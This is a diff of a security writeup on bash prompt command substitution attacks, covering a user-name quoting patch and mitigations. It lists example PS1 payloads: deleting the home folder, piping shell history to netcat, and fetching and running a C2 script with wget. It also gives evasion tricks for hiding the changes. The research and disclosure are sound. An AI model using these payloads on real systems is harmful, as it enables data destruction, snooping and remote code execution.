@@ -18,10 +18,10 @@ Yup, command substitution happens.  Bye bye, files.  Bash, like all good shells,
 
 Bash uses the environment variable, PS1 to define the prompt string.  Escaped characters like \u and \w, for instance, get expanded into other strings that are useful for dynamic prompt components, like the user name or working directory.  But even more flexibility comes from substituting the output of an arbitrary command.  In the above example, the \u in the prompt string gets substituted by `$(rm -rf ~)`, which then gets substituted by the output of running that command.  Even if the command yields no output, it has still been run.
 
-(Note, bash also recognizes PS2, PS3, and PS4, which will not be discussed further in this writeup.)
+Bash also recognizes PS2, PS3, and PS4, for various, less-commonly seen prompts.  PS2 is probably most familiar to the average user as the "> " prompt when entering a multi-line command.  All the parsing and command substitution topics discussed below also apply to those prompts, but they are less frequently encountered.  Other than to briefly note here that they might provide a more obscure or niche attack vector, they will not be discussed further in this writeup.
 
 # Parsing
-Shells have to do a lot of parsing, and do it correctly, every time.  Writing good parsers is actually really hard, in part because it’s so easy to write vulnerable code.  It’s been suggested that writing parsers should be done as rigorously as writing cryptographic libraries<sup>1</sup>)-- in other words, don’t “roll your own.”
+Shells have to do a lot of parsing, and do it correctly, every time.  Writing good parsers is actually really hard, in part because it’s so easy to write vulnerable code.  It’s been suggested that writing parsers should be done as rigorously as writing cryptographic libraries<sup>1</sup>– in other words, don’t “roll your own.”
 
 If you need a parser that doesn’t already exist, and don’t want to write it from scratch yourself, you’re in luck.  General purpose parser generators, like GNU Bison<sup>2</sup> and Yacc (Yet Another Compiler Compiler)<sup>3</sup> and various others take a user-defined, context free grammar and use it to output code (C, in this case) that performs the corresponding parsing for you.
 
@@ -29,7 +29,7 @@ The bash code base employs Bison to generate a core function called yyparse from
 
 When parsing PS1, Bash expands \ characters (like \u and \w) before it performs command substitution.  This is why `\u` -> `$(rm -rf ~)` -> `<command execution>`.  But suppose that your working path contains a directory named `$(ls)`?  Will `ls` be run?  In this case, actually, no.  The reason is that the bash source code (in `parse.y`, function `decode_prompt_string`) puts the directory string into double quotes, masking it from future expansion.
 
-For the latest master branch at the time of this writeup (bash 5.2), bash doesn’t double-quote user names after expansion from \u, though.  The good news: a patch based on this work was accepted<sup>4</sup> on 20 Jan 2025, for a future release, that double-quotes the expanded string of \u.  This exempts that string from being parsed for command substitution.
+For the latest master branch at the time of this writeup (bash 5.2), bash doesn’t double-quote user names after expansion from \u, though.  The good news: a patch based on this work was accepted<sup>4</sup> on 20 Jan 2025, for a future release, that double-quotes the expanded string of \u.  This exempts the user name string from being parsed for command substitution.
 
 When bash finds a command substitution that it needs to parse in PS1, it begins a series of nested calls starting with `decode_prompt_string` in `parse.y`, and going back and forth between routines in `parse.y`, `subst.c`, and `builtins/evalstring.c`, early on joining the common pathway of command substitution, and ultimately calling `execute_command_internal` in `execute_cmd.c`.  The subshell created to do this captures the output of the command and returns it to `decode_prompt_string`, and that goes into your prompt string.<sup>5</sup>
 
@@ -50,8 +50,12 @@ This capacity can, of course, be used for mischief in the wrong hands.  It may s
 
 One scenario is when the actor has a brief time window of opportunity to enter commands on your keyboard.  By quickly editing `.bashrc`, they may gain persistence.  Another scenario might be if they can trick a victim into running a malicious shell script and they want a reliable, one-liner payload.  Another scenario might involve an attacker who already owns the victim’s account, but needs to avoid certain canaries (i.e. alerts of compromise) or countermeasures.
 
+Yet another, potentially powerful exploit, could involve a compromised authentication server.  Speculatively, if an attacker can add or control account names in the server's database, providing a login as `$(some-command)` might allow for code execution on a network host that would otherwise offer few inroads.  `some-command` could launch a reverse shell, for instance, to help traverse a firewall.  This is an area for future research.
+
 # Mitigation, Part 1
-Beyond universal security principles, specific mitigations for this category of attack could include periodic or automatic verification of the contents of `.bashrc`, `/etc/environment`, any routine scripts, and specific environment variables.  It’s worth being aware that modules like PAM can also set environment variables, although an exploit at this level would entail more dire concerns.
+To put it simply: if an attacker can control the user name, a defender must watch out for expansion by \u.  If the attacker can control `PS1` or `PROMPT_COMMAND` directly, it doesn't necessarily matter what the user name is; the defender must protect the environment variables.  These are similar attack vectors that share a common, final pathway.  In practice, both should be guarded against in accordance with one's threat model, resources, and priorities.  Eliminating all command substitution entirely would be an effective, but quite extreme, measure, and one not likely to be worth the costs in most cases.  Not to mention, it would generally require a custom (though relatively straightforward) patch to stop it.  User name-based command substitution, on the other hand, should be effectively stopped by the aforementioned source patch in future bash releases.
+
+Beyond universal security principles (including hardening and regular audits/updates on any network authentication servers), specific mitigations for command substitution attacks could include periodic or automatic verification of the contents of `.bashrc`, `/etc/environment`, any routine scripts, and specific environment variables.  It’s worth being aware that modules like PAM can also set environment variables, although an exploit at this level would entail more dire concerns.
 
 `PS1` and `PROMPT_COMMAND` can both contain commands to validate themselves and/or the other variable, and alert the user if an unexpected state is detected.  `PROMPT_COMMAND` could reset `PS1` to a trusted value.  Either could do a checksum on the variable, or use a low-cost hash function, and compare against a trusted value (such as a value or hash stored in a write-protected file).  This would be an imperfect, but relatively inexpensive, method for situations where you could screen for changes in `PS1`.
 
@@ -98,7 +102,8 @@ Nuisances: Injecting delays, screen clearing pranks
 Snooping on command history:
 
     '$(history -a; tail -n 1 ~/.bash_history | nc -q 0 localhost 12345)\u@\h:\w$ '
-    # set up a listener on localhost 12345 to snoop on what the user is running
+    # set up a listener on localhost 12345 to snoop on what the user is running.
+    # nc -u might be necessary or simpler in some cases, too.
 
 There are limits to how real-time you can snoop.  You might expect this would allow for complete output snooping:
 
@@ -113,7 +118,7 @@ Fork bombing (see evading, below):
 
 RCE / fetching commands from a C2 server:
 
-    '$(wget -q -O - www.evil.corp/c2/script_to_run.sh | sh)\u@\h:\w$ '
+    '$(wget -q -O - www.example.com/c2/script_to_run.sh | sh)\u@\h:\w$ '
 
 Gradually filling up the file system:
 
@@ -146,8 +151,8 @@ These commands kind of stick out in PS1.  Maybe we can obfuscate them a little b
 
 You could also add to `PROMPT_COMMAND` to auto-revert `PS1`, to hide your tracks.  Lots of ways to do this, especially if `check_for_something` below is a silent shell function that you control.
 
-    `if [ "$(check_for_something)" -eq 1 ]; then PS1=$OLDPS1 "; fi`
-    ‘[ “$(check_something 2> /dev/null)” ] && PS1=$OLDPS’ # more concise, but potentially less robust than an if statement
+    'if [ "$(check_for_something)" -eq 1 ]; then PS1=$OLDPS1 "; fi'
+    '[ “$(check_something 2> /dev/null)” ] && PS1=$OLDPS' # trivially more concise, but potentially less robust than an if statement
 
 
 Recent versions of bash (since 5.1-alpha) allow `PROMPT_COMMAND` to be an array of commands.  This could facilitate removing incriminating commands without having to selectively regenerate an entire, long string.
@@ -161,7 +166,7 @@ There have even been recent debates<sup>8</sup> about what kinds of special char
 Prompt command substitution is powerful, flexible, and completely agnostic towards your security concerns.  Many of the above examples can be combined for greater effect.  Have fun experimenting with them, and try not to erase your home folder while you're at it!
 
 # Acknowledgements
-Thanks to Ben Kallus and Jonah Weinberg for ideas and discussions.  Additional thanks to
+Thanks to Ben Kallus and Jonah Weinberg for ideas and discussions, and originally identifying user name command substitution.  Additional thanks to Solra Bizna of 801 Labs for peer review, and
 
 # References
 
